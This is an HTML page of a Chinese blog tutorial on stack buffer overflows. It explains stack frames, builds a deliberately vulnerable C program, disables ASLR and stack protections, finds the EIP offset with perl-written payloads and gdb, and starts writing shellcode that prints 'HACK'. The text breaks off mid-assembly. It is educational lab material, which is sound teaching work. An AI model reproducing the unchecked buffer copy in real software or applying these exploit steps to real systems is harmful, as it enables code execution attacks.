@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="王六六">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="王六六">
+    <meta name="keywords" content="王六六的博客 | 王六六">
+    <meta name="description" content="It's raining cats and dogs.">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>浅析缓冲区溢出 · wang66&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Still Shines.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">浅析缓冲区溢出</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Still Shines.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            浅析缓冲区溢出
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="缓冲区">缓冲区</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4.4k</span> / Reading time: <span class="post-count">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/08/18</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>最近一直在学习缓冲区溢出漏洞的攻击，但是关于这一块的内容还是需要很多相关知识的基础，例如编程语言及反汇编工具使用。所以研究透彻还需要不少的时间，这里简单的做一个学习的总结，通过具体的实验案例对缓冲区溢出进行简要的解析，第一篇关于缓冲区的文章，可能还有很多地方解释不到位，之后尽量补全。<a id="more"></a></p>
+<p>汇编语言及编程语言是基础，其次是对反编译工具的使用：比如<strong>gdb</strong>、<strong>IDA pro</strong>、<strong>objdump</strong>等。汇编语言的学习可以看王爽编写的《汇编语言》，很适合初学者学习的一本书。(对于初学者来说，必要的知识屏蔽是很重要的，这本书就是按这个思想编写，所以看这本书的感觉就非常流畅。)</p>
+<p>缓冲区溢出是一种常见的攻击手段，原因在于缓冲区漏洞非常普遍，并且易于实现。缓冲区溢出漏洞占了远程网络攻击的绝大多数，成为远程攻击的主要手段。在CTF比赛中这一类的题目也是非常热门(pwn题)。利用缓冲区溢出攻击可以导致程序运行失败、系统崩溃等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p>
+<!-- TOC -->
+<ul>
+<li><a href="#缓冲区溢出及其原理">缓冲区溢出及其原理</a><ul>
+<li><a href="#编译源程序">编译源程序</a></li>
+<li><a href="#执行程序">执行程序</a></li>
+<li><a href="#原因分析">原因分析</a></li>
+</ul>
+</li>
+<li><a href="#缓冲区溢出攻击例子">缓冲区溢出攻击例子</a><ul>
+<li><a href="#一创建程序">一、创建程序</a></li>
+<li><a href="#二编译程序">二、编译程序</a></li>
+<li><a href="#三覆盖eip">三、覆盖EIP</a></li>
+<li><a href="#四构造shellcode">四、构造shellcode</a></li>
+<li><a href="#五注入shellcode">五、注入shellcode</a></li>
+</ul>
+</li>
+<li><a href="#缓冲区溢出攻击的防范">缓冲区溢出攻击的防范</a></li>
+</ul>
+<!-- /TOC -->
+<h1 id="缓冲区溢出及其原理"><a href="#缓冲区溢出及其原理" class="headerlink" title="缓冲区溢出及其原理"></a>缓冲区溢出及其原理</h1><p>关于缓冲区溢出的原理网上也很多，这里用一个我觉得不错的实验示例进行讲解。</p>
+<p><font color="red">(注意：此处编译环境为CentOS  5.0 (32bit)，其他版本的linux可能需要修改9、10行代码)</font><br>先来看以下这个例子：<br>首先用C语言编写一个程序，如下所示，保存为buffer.c文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">8</span>];  <span class="comment">//创建一个大小为8 的缓冲区</span></span><br><span class="line">	<span class="keyword">int</span> *ret;    </span><br><span class="line">	ret=(<span class="keyword">int</span>*)(buffer+<span class="number">16</span>);  </span><br><span class="line">	(*ret)+=<span class="number">7</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">	<span class="keyword">int</span> x;  </span><br><span class="line">	x=<span class="number">99999</span>;  </span><br><span class="line">	function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  </span><br><span class="line">	x=<span class="number">1</span>;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);  </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="编译源程序"><a href="#编译源程序" class="headerlink" title="编译源程序"></a>编译源程序</h2><p>如图1所示，执行#gcc  buffer.c  –o  buffer.o命令，编译源程序。<font color="red">(有些高版本的linux可以加-fno-stack-protector  -z  execstack参数关闭保护措施 )</font><br><img src="http://img.wandoutech.com/img/141601.png" alt></p>
+<h2 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h2><p>如图1所示，执行./buffer.o命令，输出结果99999.通过分析主函数的流程，应该输出1，可是输出的为99999。原因在于function()函数。</p>
+<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>下面对buffer.o程序在内存中的分步情况及执行流程进行分析。<br>一个程序在内存中通常分为程序段、数据段和堆栈。<br>(1)<strong>程序段</strong>：存放程序的机器码和只读数据<br>(2)<strong>数据段</strong>：存放程序中的静态数据和全局变量<br>(3)<strong>堆栈</strong>：存放动态数据及局部变量<br>在内存中，它们的位置如图2所示:<br><img src="http://img.wandoutech.com/img/141626.png" alt><br>堆栈是一块保存数据的连续内存，一个名为堆栈指针(SP)的寄存器标识出了栈顶的位置，堆栈的底部在一个固定的地址。图2简化了一下如图3所示，栈的增长是由低地址位向高地址位，而堆的增长刚好相反。<br><img src="http://img.wandoutech.com/img/141836.png" alt><br>理论上说，局部变量可以用SP加偏移量来引用。堆栈由逻辑堆栈帧组成，一个函数对应一个堆栈帧。<br><strong><em>当调用函数时</em></strong>，逻辑堆栈帧被压入栈中，堆栈帧包括函数的参数、返回地址、EBP(EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码)和局部变量(如果函数有局部变量)。程序执行结束后，局部变量的内容将会消失，但是不会被清除。<br><strong><em>当函数返回时</em></strong>，逻辑堆栈帧从栈中被弹出，然后弹出EBP，恢复堆栈到调用函数时的地址，最后弹出返回地址到EIP(寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。)，从而继续运行程序。<br>如过想多了解一些关于寄存器的知识，可以阅读这篇文章：(<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/37912755</a>)<br>接下来，我们来看function(1,2,3)函数，调用函数的过程如图4所示：<br><img src="http://img.wandoutech.com/img/141856.png" alt><br>&emsp;首先把参数压入栈：在C语言中参数的压栈顺序是反向的，是以从后往前的顺序将function的3个参数3,2,1压入栈中。<br>&emsp;然后保存指令寄存器(ip)中的内容作为返回地址(return2)压入栈中；第3个放入栈的是基址寄存器EBP(sfp)。<br>&emsp;接着把当前的栈指针(sp)复制到EBP，作为新栈帧的基地址(sfp，栈帧指针)。这里准备进入function函数。<br>&emsp;最后把栈指针(sp)减去适当的数值(可以理解为指针由高地址位向低地址位滑动)，将局部变量(buffer和ret)压入栈中执行第9行语句ret=(int<em>)(buffer+16)；后，指针ret指向return2所指的存储单元；<br>&emsp;执行代码中第10行语句(</em>ret)+=7；后，调用函数function()后的返回地址(return2所指的存储单元)指向了第18行，第17行被隔过去了，溢出的数据覆盖了原来的返回地址，因此，该程序的输出结果是99999。<br>这个就是一个简单的栈溢出的情况。</p>
+<h1 id="缓冲区溢出攻击例子"><a href="#缓冲区溢出攻击例子" class="headerlink" title="缓冲区溢出攻击例子"></a>缓冲区溢出攻击例子</h1><p>接下来，我们将要思考一段包含了可利用缓冲区溢出的代码，并据此展示一次攻击。<br>&emsp;在具体地讨论缓冲区溢出攻击之前，可以先考虑一下此类攻击可能会爆发的现实场景。假设网站上web表单请用户输入数据，如姓名、年龄、出生日期等此类的相关信息。被输入的信息随后被传送到一台服务器上，而这台服务器会将“姓名”字段中输入的数据写入可以容纳N个字符的缓冲区中。如果服务器软件没有去验证可以确保输入的姓名的长度至多为N个字符的话，就可能会发生一次缓冲区溢出。如果溢出的数据是一段恶意代码，那么系统也将可能会去执行，从而受到攻击。<br>&emsp;这里我使用的系统是<strong>ubuntu 18.04 (64bit)</strong>。当前硬件已支持数据保护功能，也即栈上注入的指令无法执行，同时现在的操作系统默认启用地址随机化功能，所有很难猜测到EIP注入的地址。这里就先要把实验环境配置好(这一步很重要，如果实验中出现问题，很大可能就是环境配置的关系)：</p>
+<blockquote>
+<ol>
+<li>关闭地址随机化功能(这里可能会遇到权限问题，可以手动修改，把里面的值改为0即可)：</li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol start="2">
+<li>这次测试用到的是编译出32位程序，但现在常见的都是64位系统，可以先安装gcc编译32位程序用到的库：</li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+<h2 id="一、创建程序"><a href="#一、创建程序" class="headerlink" title="一、创建程序"></a>一、创建程序</h2><p>我们先构建一段代码开始，命名为bo.c。(这里为了直接展示缓冲区漏洞攻击方法，就省掉了与网络相关的部分。)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];  </span><br><span class="line">    FILE *fp;  </span><br><span class="line">    fp = fopen(<span class="string">"test.txt"</span>, <span class="string">"r"</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!fp) </span><br><span class="line">	&#123;  </span><br><span class="line">    	perror(<span class="string">"fopen"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    fread(buf, <span class="number">1024</span>, <span class="number">1</span>, fp);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"data: %s\n"</span>, buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">	  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	f();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>简要的分析下这段代码有溢出问题的原因是：这段程序的作用是输出文件中的字符，它声明的buf数组的字符数量为32，但是拷贝了最多可达1024个字符，因此就可以把文件的字符如果超过一定的数量，就会造成溢出，并被程序执行这些溢出的字符。</p>
+<h2 id="二、编译程序"><a href="#二、编译程序" class="headerlink" title="二、编译程序"></a>二、编译程序</h2><p>编译源程序，输入如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -fno-stack-protector -o bo bo.c -m32 -Wl,-zexecstack</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>这里加了几个参数，它们的功能分别是：<br>-fno-stack-protector : 禁用栈溢出检测功能<br>-m32 : 生成32位程序<br>-Wl,-zexecstack : 支持栈端可执行</p>
+<hr>
+<p>看解释就知道为什么加这些参数了。<br>编译完成之后，我们简要的说明下一步该如何利用溢出进行攻击。思路如下：<br>&emsp;使用的也是上一个例子的原理，buf数组溢出后，从文件读取的内容就会在当前栈帧沿着高地址覆盖，而该栈帧的顶部存放着返回上一个函数的地址(EIP)，只要我们覆盖了该地址，就可以修改程序的执行路径，使它运行文件中的代码。这种攻击一般也叫做返回库函数攻击。<br>&emsp;因此，我们需要知道从文件读取多少个字节才能开始覆盖EIP。常见的方法有两种：<br>&emsp;一种方法是反编译程序进行推导，另一种方法就是进行基本的手工测试。第一种方法通常需要更深入的汇编知识，且适用于不知道源码的情况。这里我们已经知道源码，已经发现了问题所在，所以就选择后者进行尝试，确定一下写个多少字节才能覆盖EIP。</p>
+<h2 id="三、覆盖EIP"><a href="#三、覆盖EIP" class="headerlink" title="三、覆盖EIP"></a>三、覆盖EIP</h2><p>根据源码我们创建text.txt文件并写入字符进行尝试，尝试的方法很简单，EIP前的空间使用’A’填充，而EIP使用’BBBB’填充，使用两种不同的字母是为了方便找到边界。<br>&emsp;目前知道buf数组大小为32个字符，可以先尝试填充32个’A’和追加’BBBB’，如果程序没有出现segment fault(段错误)，则每次增加’A’字符4个，不断尝试直到程序运行出现segment fault。(我这里到48个的时候出现segment fault，32位系统大概在40左右)如果 ‘BBBB’刚好对准EIP的位置，那么函数返回时，将EIP内容将给PC指针，因为0x42424242(B的ascii码为0x42)是不可访问地址，所以出现segment fault，此时eip寄存器值就是0x42424242。<br>&emsp;这里可以手工在文件文件中输入字符，但毕竟繁琐，所以可以使用perl脚本写入(之后写入shellcode也要用到)。<br>所经过的尝试如下：<br><strong>第一次：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x32 . &quot;B&quot;x4&apos; &gt; test.txt ;</span><br></pre></td></tr></table></figure>
+<p>写入文件中的内容为：AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB<br>再运行程序./bo<br><img src="http://img.wandoutech.com/img/141915.png" alt><br>结果：已溢出，造成输出乱码，但没有segment fault。<br><strong>第二次增加4个A字符：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x36 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.wandoutech.com/img/141934.png" alt><br><strong>之后的步骤省略，跳到出现segment fault的这一步：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.wandoutech.com/img/141946.png" alt><br>结果：产生了segment fault。</p>
+<hr>
+<p>接下来就使用调试工具gdb，分析并确定此时的EIP是否为0x42424242。<br>1.在使用gdb前，首先输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>
+<p>用这个命令是为了产生core文件，core就是程序运行发行段错误时的文件。<br>2.接着运再行一下上面的出错的那条指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bo</span><br></pre></td></tr></table></figure>
+<p>此时当前目录下会出现一个core文件</p>
+<p><img src="http://img.wandoutech.com/img/142023.png" alt></p>
+<p>3.之后就是使用gdb分析程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./bo core –q</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.wandoutech.com/img/142054.png" alt></p>
+<p>分析core文件，发现eip被写成’0x424242’(BBBB)，可以确定注入内容中的’BBBB’对准了栈中存放EIP的位置。 找到EIP位置，我们就离成功迈进了一大步。值得注意的是：现在的系统有保护机制，所以找准eip的难度会大大增加。不过现在也有出现了更多有效的方法，感兴趣的朋友可以更深入地进行学习。</p>
+<hr>
+<h2 id="四、构造shellcode"><a href="#四、构造shellcode" class="headerlink" title="四、构造shellcode"></a>四、构造shellcode</h2><p>通过之前的步骤，我们可以控制EIP之后，下一步操作就是往栈里面注入二进指令，然后修改EIP执行这段代码。那么当函数执行完后，就会执行我们的指令啦。<br> 通常我们将注入的这段指令称为shellcode，解释为这段指令是打开一个shell(bash)，然后攻击者可以在shell执行任意命令，所以称为shellcode。<br> 这里我们不需要写一段复杂的shellcode去打开shell。为了能证明成功控制程序，我们可以使它在终端上输出”HACK”字符串，然后程序退出。 简便起见， 我们构造的shellcode就相当于下面两句C语言的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(1, &quot;HACK\n&quot;, 5);</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></p>
+<p>因为shellcode将会直接操作寄存器和一些系统调用，所以对于shellcode的编写基本上是用高级语言编写一段程序然后编译，反汇编从而得到16进制的操作码，当然也可以直接写汇编然后从二进制文件中提取出16进制的操作码。 下面就是32位x86的汇编代码shell.s：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BITS 32  </span><br><span class="line">start:  </span><br><span class="line">xor eax, eax  </span><br><span class="line">xor ebx, ebx  </span><br><span class="line">xor ecx, ecx  </span><br><span class="line">xor edx, edx  </span><br><span class="line">	  </span><br><span class="line">mov bl, 1  </span><br><span class="line">add esp, string - start  </span><br><span class="line">mov 